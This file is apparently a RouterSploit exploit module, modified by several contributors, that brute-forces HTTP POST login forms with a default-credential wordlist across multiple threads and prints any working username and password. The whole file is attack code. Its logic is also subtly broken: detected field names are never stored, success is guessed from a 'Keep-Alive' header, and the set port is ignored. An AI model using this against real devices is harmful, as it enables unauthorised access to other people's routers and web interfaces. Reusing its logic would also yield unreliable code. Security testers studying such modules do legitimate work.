from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.resources import wordlists
from requests_html import HTMLSession
import requests


class Exploit(HTTPClient):
    __info__ = {
        "name": "HTTP Post Default Creds",
        "description": "Module performs dictionary attack with default credentials against HTTP Post Auth service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
            "Alexander Yakovlev <https://github.com/toxydose>",  # upgrading to perform bruteforce attack against HTTP Digest Auth service
            "Kaz Bishop <evillogic1[at]gmail.com>", # modified to bruteforce web interfaces
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")

    threads = OptInteger(8, "Number of threads")

    defaults = OptWordlist(wordlists.defaults, "User:Pass or file with default credentials (file://)")

    path = OptString("/", "URL Path")

    username_field = OptString("", "Name of the username input field on the interface")
    password_field = OptString("", "Name of the password input field on the interface")

    verbosity = OptBool(True, "Display authentication attempts")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")

    def run(self):
        self.credentials = []
        self.auth_type = None

        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default creds attack against {}".format(self.path))

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":")

                auth = {
                    self.username_field : username,
                    self.password_field : password,
                    }

                #response = self.http_request(
                #    method="POST",
                #    path=self.path,
                #    data=auth,
                #)
                response = requests.post("http://" + self.target + self.path, auth)

                if response is not None and response.headers["Connection"] == "Keep-Alive":
                    if self.stop_on_success:
                        running.clear()

                    print_success("Authentication Succeed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))

                else:
                    print_error("Authentication Failed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)

            except StopIteration:
                break

    def check(self):
        session = HTMLSession()
        try:
            r = session.get(self.target)
        except:
            print_error("Connection Exception")
            return False
        
        username_element = r.html.find('[type=text]', first=True)
        if 'name' in username_element.attrs:
            username_field = username_element.attrs['name']
        elif 'id' in username_element.attrs:
            username_field = username_element.attrs['id']
        else:
            print_error("No username field found")
            return False
        
        password_element = r.html.find('[type=password]', first=True)
        if 'name' in password_element.attrs:
            password_field = password_element.attrs['name']
        elif 'id' in password_element.attrs:
            password_field = password_element.attrs['id']
        else:
            print_error("No password field found")
            return False
        
        if self.username_field == "" or self.password_field == "":
            return False
        
        return True

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []

            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)

            if self.credentials:
                return self.credentials

        return None
